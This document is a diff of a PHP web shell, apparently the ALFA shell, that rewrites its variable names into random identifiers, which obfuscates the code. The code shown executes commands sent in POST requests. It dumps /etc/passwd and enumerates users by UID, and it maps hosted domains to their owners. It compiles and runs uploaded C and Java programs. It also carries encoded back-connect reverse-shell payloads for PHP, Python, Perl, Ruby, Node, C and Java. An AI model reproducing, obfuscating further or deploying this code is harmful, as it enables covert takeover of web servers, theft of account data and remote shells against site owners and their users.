+if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "cd '".addslashes($_POST["c"])."';";}
+echo alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452.$_POST['alfa1'], true);
 echo '</pre>';
 }
 echo "</div>";
@@ -3605,75 +3678,75 @@ echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)"
 if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains'){
 if(!_alfa_file_exists("/etc/virtual/domainowners")){
 echo __pre();
-$solevisible9 = _alfa_file('/etc/named.conf');
-if(is_array($solevisible9)){
-foreach($solevisible9 as $solevisible13){
-if(@eregi('zone',$solevisible13)){
-preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
-if(strlen(trim($solevisible14[1][0])) > 2){
-echo $solevisible14[1][0].'<br>';
+$xbnvmquj24b2b880906fb1857d638c63c3df42ad = _alfa_file('/etc/named.conf');
+if(is_array($xbnvmquj24b2b880906fb1857d638c63c3df42ad)){
+foreach($xbnvmquj24b2b880906fb1857d638c63c3df42ad as $wibnxjovff0b9814dccd6ec71c83157e4e2a66fa){
+if(@eregi('zone',$wibnxjovff0b9814dccd6ec71c83157e4e2a66fa)){
+preg_match_all('#zone "(.*)"#',$wibnxjovff0b9814dccd6ec71c83157e4e2a66fa,$krfvyjtj39c2c4f56a5254caff10014767ed6cd7);
+if(strlen(trim($krfvyjtj39c2c4f56a5254caff10014767ed6cd7[1][0])) > 2){
+echo $krfvyjtj39c2c4f56a5254caff10014767ed6cd7[1][0].'<br>';
 }}}
 }
 }else{
 echo __pre();
-$users = _alfa_file("/etc/virtual/domainowners");
-if(is_array($users)){
-foreach($users as $boz){
-$dom = explode(":",$boz);
-echo $dom[0]."\n";}}}}
+$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
+if(is_array($qbyndzxd9bc65c2abec141778ffaa729489f3e87)){
+foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
+$schrznsmdd988cfd769c9f7fbd795a0f5da8e751 = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
+echo $schrznsmdd988cfd769c9f7fbd795a0f5da8e751[0]."\n";}}}}
 if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases'){
 echo '
 <form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
 if(isset($_POST['alfa9']) && $_POST['alfa9'] == '>>'){
 if(!_alfa_file_exists("/etc/virtual/domainowners")){
-$site = trim($_POST['alfa7']);
-$rep = str_replace(array("https://","http://","www."),"",$site);
-$user = "";
+$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = trim($_POST['alfa7']);
+$fdkgyovx75a384057459ae8e69fb9a98a249b4f4 = str_replace(array("https://","http://","www."),"",$svjurwzc98defd6ee70dfb1dea416cecdf391f58);
+$eeodyzriee11cbb19052e40b07aac0ca060c23ee = "";
 if(function_exists("posix_getpwuid") && function_exists("fileowner")){
-	if($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
-		$user = $user['name'];
+	if($eeodyzriee11cbb19052e40b07aac0ca060c23ee = @posix_getpwuid(@fileowner("/etc/valiases/{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}"))){
+		$eeodyzriee11cbb19052e40b07aac0ca060c23ee = $eeodyzriee11cbb19052e40b07aac0ca060c23ee['name'];
 	}
 }else{
 	if(_alfa_can_runCommand(true,true)){
-		$user = alfaEx("stat -c '%U' /etc/valiases/".$rep);
+		$eeodyzriee11cbb19052e40b07aac0ca060c23ee = alfaEx("stat -c '%U' /etc/valiases/".$fdkgyovx75a384057459ae8e69fb9a98a249b4f4);
 	}
 }
-if(!empty($user)&&$user!='root'){
-echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
+if(!empty($eeodyzriee11cbb19052e40b07aac0ca060c23ee)&&$eeodyzriee11cbb19052e40b07aac0ca060c23ee!='root'){
+echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$eeodyzriee11cbb19052e40b07aac0ca060c23ee}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}</font></b></td></tr></table></center>";
 }else {echo __pre().'<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
 }else{
-$site = trim($_POST['alfa7']);
-$rep = str_replace(array("https://","http://","www."),"",$site);
-$users = _alfa_file("/etc/virtual/domainowners");
-foreach($users as $boz){
-$ex = explode(":",$boz);
-if($ex[0] == $rep){
+$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = trim($_POST['alfa7']);
+$fdkgyovx75a384057459ae8e69fb9a98a249b4f4 = str_replace(array("https://","http://","www."),"",$svjurwzc98defd6ee70dfb1dea416cecdf391f58);
+$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
+foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
+$zlkzobcq54d54a126a783bc9cba8c06137136943 = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
+if($zlkzobcq54d54a126a783bc9cba8c06137136943[0] == $fdkgyovx75a384057459ae8e69fb9a98a249b4f4){
 echo __pre()."<center><table border='1'>
-<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
-<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
+<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($zlkzobcq54d54a126a783bc9cba8c06137136943[1])."</font></b></td></tr>
+<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}</font></b></td></tr></table></center>";break;}}}}}
 if(!empty($_POST['alfa5']) && isset($_POST['alfa5'])){
 if(!_alfa_file_exists("/etc/virtual/domainowners")){
 echo __pre();
-$i = 0;
-while ($i < 60000) {
-$line = @posix_getpwuid($i);
-if (!empty($line)) {
-while (list ($key, $vl) = each($line)){
-echo $vl."\n";
-break;}}$i++;}
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
+while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < 60000) {
+$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = @posix_getpwuid($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741);
+if (!empty($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)) {
+while (list ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $jpaoohwt28b3aabbdbbe9733da0a27c8c80a0eb7) = each($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)){
+echo $jpaoohwt28b3aabbdbbe9733da0a27c8c80a0eb7."\n";
+break;}}$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;}
 }else{echo __pre();
-$users = _alfa_file("/etc/virtual/domainowners");
-foreach($users as $boz){
-$user = explode(":",$boz);
-echo trim($user[1]).'<br>';}}}
+$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
+foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
+$eeodyzriee11cbb19052e40b07aac0ca060c23ee = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
+echo trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee[1]).'<br>';}}}
 if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
 echo __pre();
 if(_alfa_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
-for($uid=0;$uid<60000;$uid++){
-$ara = @posix_getpwuid($uid);
-if(!empty($ara)){
-while(list ($key, $val) = each($ara)){
-echo "$val:";
+for($uwdmfmmt9871d3a2c554b27151cacf1422eec048=0;$uwdmfmmt9871d3a2c554b27151cacf1422eec048<60000;$uwdmfmmt9871d3a2c554b27151cacf1422eec048++){
+$ltylgdel636bfa0fb2716ff876f5e33854cc9648 = @posix_getpwuid($uwdmfmmt9871d3a2c554b27151cacf1422eec048);
+if(!empty($ltylgdel636bfa0fb2716ff876f5e33854cc9648)){
+while(list ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf) = each($ltylgdel636bfa0fb2716ff876f5e33854cc9648)){
+echo "$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf:";
 }echo "\n";}}
 }else{__alert('failed...');}}
 if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
@@ -3691,131 +3764,131 @@ echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
 echo "<br></div>";
 alfafooter();
 }
-function __get_resource($content){
-return @gzinflate(__ZGVjb2Rlcg($content));
+function __get_resource($mveevork9a0364b9e99bb480dd25e1f0284c8555){
+return @gzinflate(__ZGVjb2Rlcg($mveevork9a0364b9e99bb480dd25e1f0284c8555));
 }
-function __write_file($file, $content){
-if($fh = @fopen($file, "wb")){
-if(fwrite($fh, $content)!==false) return true;
+function __write_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $mveevork9a0364b9e99bb480dd25e1f0284c8555){
+if($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62 = @fopen($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, "wb")){
+if(fwrite($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, $mveevork9a0364b9e99bb480dd25e1f0284c8555)!==false) return true;
 }
 return false;
 }
-function bcinit($evalType, $evalCode, $evalOptions, $evalArguments){
-$res = "<font color='green'>[ Success...! ]</font>";
-$err = "<font color='red'>[ Failed...! ]</font>";
-if($evalOptions!="") $evalOptions = $evalOptions." ";
-if($evalArguments!="") $evalArguments = " ".$evalArguments;
-if($evalType=="c"){
-$tmpdir = ALFA_TEMPDIR;
-chdir($tmpdir);
-if(is_writable($tmpdir)){
-$uniq = substr(md5(time()),0,8);
-$filename = $evalType.$uniq.".c";
-$path = $filename;
-if(__write_file($path, $evalCode)){
-$ext = ($GLOBALS['sys']=='win')? ".exe":".out";
-$pathres = $filename.$ext;
-$evalOptions = "-o ".$pathres." ".$evalOptions;
-$cmd = "gcc ".$evalOptions.$path;
-alfaEx($cmd);
-if(is_file($pathres)){
-if(chmod($pathres, 0755)){
-$cmd = $pathres.$evalArguments;
-alfaEx($cmd);
-}else{$res = $err;}
-unlink($pathres);
-}else{$res = $err;}
-unlink($path);
-}else{$res = $err;}
+function bcinit($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11, $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c, $rvldmxgwf5b0c5d53a726b399ac97f64ef84054a){
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = "<font color='green'>[ Success...! ]</font>";
+$xvngexov56bd7107802ebe56c6918992f0608ec6 = "<font color='red'>[ Failed...! ]</font>";
+if($lbzvzoec05e72357fd60ba5e66d87abf6947ec4c!="") $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c = $lbzvzoec05e72357fd60ba5e66d87abf6947ec4c." ";
+if($rvldmxgwf5b0c5d53a726b399ac97f64ef84054a!="") $rvldmxgwf5b0c5d53a726b399ac97f64ef84054a = " ".$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
+if($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311=="c"){
+$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
+chdir($qofyaewi3f70a5cb5712430a7869904d10f14c87);
+if(is_writable($qofyaewi3f70a5cb5712430a7869904d10f14c87)){
+$tednfjezceb6b355c65c1ee318991aead0f652e4 = substr(md5(time()),0,8);
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311.$tednfjezceb6b355c65c1ee318991aead0f652e4.".c";
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $ydojshxa435ed7e9f07f740abf511a62c00eef6e;
+if(__write_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11)){
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = ($GLOBALS['sys']=='win')? ".exe":".out";
+$tmqejnqb223e432bb7645153883f42259bd6a8fa = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.$uzehrcsaabf77184f55403d75b9d51d79162a7ca;
+$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c = "-o ".$tmqejnqb223e432bb7645153883f42259bd6a8fa." ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c;
+$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "gcc ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
+alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+if(is_file($tmqejnqb223e432bb7645153883f42259bd6a8fa)){
+if(chmod($tmqejnqb223e432bb7645153883f42259bd6a8fa, 0755)){
+$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = $tmqejnqb223e432bb7645153883f42259bd6a8fa.$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
+alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
+unlink($tmqejnqb223e432bb7645153883f42259bd6a8fa);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
+unlink($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
 }
-return $res;
-}elseif($evalType=="java"){
-$tmpdir = ALFA_TEMPDIR;
-chdir($tmpdir);
-if(is_writable($tmpdir)){
-if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
-$classname = trim($r[1]);
-$filename = $classname;
+return $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
+}elseif($rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311=="java"){
+$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
+chdir($qofyaewi3f70a5cb5712430a7869904d10f14c87);
+if(is_writable($qofyaewi3f70a5cb5712430a7869904d10f14c87)){
+if(preg_match("/class\ ([^{]+){/i",$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11, $yxarqqmp4b43b0aee35624cd95b910189b3dc231)){
+$jnanqshy26b2a720f7b8c9bd8d3999c52da409d0 = trim($yxarqqmp4b43b0aee35624cd95b910189b3dc231[1]);
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $jnanqshy26b2a720f7b8c9bd8d3999c52da409d0;
 }else{
-$uniq = substr(md5(time()),0,8);
-$filename = $evalType.$uniq;
-$evalCode = "class ".$filename." { ".$evalCode . " } ";
+$tednfjezceb6b355c65c1ee318991aead0f652e4 = substr(md5(time()),0,8);
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $rftbxsfo0ff6c5ee82f758f5f23bf98b4c0d6311.$tednfjezceb6b355c65c1ee318991aead0f652e4;
+$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11 = "class ".$ydojshxa435ed7e9f07f740abf511a62c00eef6e." { ".$lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11 . " } ";
 }
-$path = $filename.".java";
-if(__write_file($path, $evalCode)){
-$cmd = "javac ".$evalOptions.$path;
-alfaEx($cmd);
-$pathres = $filename.".class";
-if(is_file($pathres)){
-if(chmod($pathres, 0755)){
-$cmd = "java ".$filename.$evalArguments;
-alfaEx($cmd);
-}else{$res = $err;}
-unlink($pathres);
-}else{$res = $err;}
-unlink($path);
-}else{$res = $err;}
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.".java";
+if(__write_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485, $lnjmsmft9235e4dbbdbba2d0a7bab090e425aa11)){
+$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "javac ".$lbzvzoec05e72357fd60ba5e66d87abf6947ec4c.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
+alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+$tmqejnqb223e432bb7645153883f42259bd6a8fa = $ydojshxa435ed7e9f07f740abf511a62c00eef6e.".class";
+if(is_file($tmqejnqb223e432bb7645153883f42259bd6a8fa)){
+if(chmod($tmqejnqb223e432bb7645153883f42259bd6a8fa, 0755)){
+$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "java ".$ydojshxa435ed7e9f07f740abf511a62c00eef6e.$rvldmxgwf5b0c5d53a726b399ac97f64ef84054a;
+alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
+unlink($tmqejnqb223e432bb7645153883f42259bd6a8fa);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
+unlink($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+}else{$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xvngexov56bd7107802ebe56c6918992f0608ec6;}
 }
-return $res;
+return $ybaqpbzt9b207167e5381c47682c6b4f58a623fb;
 }
 return false;
 }
 function alfaconnect(){
 alfahead();
-$php="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
-$python="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
-$perl="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
-$ruby="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
-$node="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
-$c="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
-$java="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
